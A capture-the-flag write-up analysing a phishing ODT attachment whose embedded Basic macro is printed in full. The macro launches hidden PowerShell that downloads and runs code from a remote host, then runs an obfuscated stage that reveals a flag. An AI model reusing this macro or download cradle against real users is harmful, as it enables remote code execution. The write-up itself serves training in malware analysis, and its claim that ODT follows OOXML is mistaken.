# Big Phish

The attachment on the email was an ODT file. ODT files are essentialy zip files as they follow the OOXML standard. To get a better idea of what's going on we can unzip `bigphish.odt`.

```
$ unzip bigphish.odt
Archive:  bigphish.odt
   creating: Basic/
   creating: Basic/Standard/
  inflating: Basic/Standard/script-lb.xml
  inflating: Basic/Standard/Module1.xml
  inflating: Basic/script-lc.xml
   creating: Configurations2/
   creating: Configurations2/accelerator/
  inflating: Configurations2/accelerator/current.xml
  inflating: content.xml
  inflating: manifest.rdf
  inflating: meta.xml
   creating: META-INF/
  inflating: META-INF/manifest.xml
  inflating: mimetype
  inflating: settings.xml
  inflating: styles.xml
   creating: Thumbnails/
  inflating: Thumbnails/thumbnail.png
```

Something that immediately stands out are the script xml files. Office documents can contain malicious macros that, when enabled and run, spawn reverse shells or execute arbitrary malicious code.

If we examine `Basic/Standard/Module1.xml` we can see a metasploit-generated macro payload.

```Powershell
Sub Exploit
    Shell(&quot;cmd.exe /C &quot;&quot;powershell.exe -nop -w hidden -c $x=new-object net.webclient;$x.proxy=[Net.WebRequest]::GetSystemWebProxy();$x.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $x.downloadstring(&#39;http://10.10.14.9:8080/rH41wL&#39;);[STRiNg]::joIN('' , ( '24t66:6c:61:67W20:3d~20-22r43-55t43W54-46W7b-50r6c~33%6er37Y79:5fr30W66W5fY50~68-31Y35Y68-5fW31:6e%5f%37~68Y33:5ft73%33r41Y7dt22' -SplIT'-' -sPlIT':' -spLiT'~'-Split'r' -SpliT'W' -SplIt 't' -SPlIT'Y'-SPlIt'%'| FOReACH { ( [CONVeRT]::TOint16( ( [StRinG]$_ ) , 16 )-As[cHAR]) }))|.( 'i'+[cHaR]([ConvERt]::ToiNT16(65, 16))+'x')&quot;&quot;&quot;)
End Sub
```

This payload executes cmd.exe which calls powershell.exe. That powershell process then downloads a file to the victim's computer. The next string appears to be heavily obfuscated. If we copy everything before the `|`, we should be able to safely deobfuscate the powershell. The content after the pipe is as follows:

```Powershell
|.( 'i'+[cHaR]([ConvERt]::ToiNT16(65, 16))+'x')
```

This is what runs the potentially malicious powershell preceding it. Deobfuscated, it translates to `iex` - the shorthand form of `Invoke-Expression`.

```
PS /root/> [STRiNg]::joIN('' , ( '24t66:6c:61:67W20:3d~20-22r43-55t43W54-46W7b-50r6c~33%6er37Y79:5fr30W66W5fY50~68-31Y35Y68-5fW31:6e%5f%37~68Y33:5ft73%33r41Y7dt22' -SplIT'-' -sPlIT':' -spLiT'~'-Split'r' -SpliT'W' -SplIt 't' -SPlIT'Y'-SPlIt'%'| FOReACH { ( [CONVeRT]::TOint16( ( [StRinG]$_ ) , 16 )-As[cHAR]) }))
$flag = "CUCTF{Pl3n7y_0f_Ph15h_1n_7h3_s3A}"
```
